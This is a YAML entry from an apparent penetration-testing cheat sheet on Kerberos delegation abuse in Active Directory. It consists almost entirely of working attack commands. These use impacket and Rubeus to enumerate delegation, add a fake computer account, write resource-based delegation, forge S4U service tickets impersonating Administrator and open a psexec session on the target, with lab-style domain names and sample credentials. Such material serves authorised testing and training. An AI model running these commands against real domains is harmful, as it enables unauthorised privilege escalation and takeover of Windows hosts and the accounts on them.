---
description: |
  Kerberos delegation abuse — exploit unconstrained, constrained, and resource-based constrained delegation (RBCD) to impersonate users.
commands:
  - have: Credentials
    cmd: |
      # Find delegation settings in the domain
      impacket-findDelegation senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27

      # RBCD — add a computer account for resource-based constrained delegation
      impacket-addcomputer senshu.sh/sec_user:'P@ssw0rd' -computer-name 'FAKEPC$' -computer-pass 'FakeP@ss123' -dc-ip 10.10.10.27

      # RBCD — configure delegation from fake computer to target
      impacket-rbcd senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -action write -delegate-from 'FAKEPC$' -delegate-to 'TARGET$'

      # RBCD — request service ticket via S4U
      impacket-getST senshu.sh/'FAKEPC$':'FakeP@ss123' -spn cifs/TARGET.senshu.sh -impersonate Administrator -dc-ip 10.10.10.27

      # Rubeus — S4U for constrained delegation
      .\Rubeus.exe s4u /user:sec_user /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.senshu.sh /ptt
  - have: TGT
    cmd: |
      # Use TGT for constrained delegation exploitation
      export KRB5CCNAME=ticket.ccache

      # Request service ticket impersonating admin (Kerberos only)
      impacket-getST senshu.sh/sec_user -spn cifs/TARGET.senshu.sh -impersonate Administrator -dc-ip 10.10.10.27 -k -no-pass

      # Access target with impersonated ticket
      export KRB5CCNAME=Administrator@cifs_TARGET.senshu.sh@SENSHU.SH.ccache
      impacket-psexec senshu.sh/Administrator@TARGET.senshu.sh -k -no-pass
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
techniques:
  - Delegation_Abuse
references:
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html
---
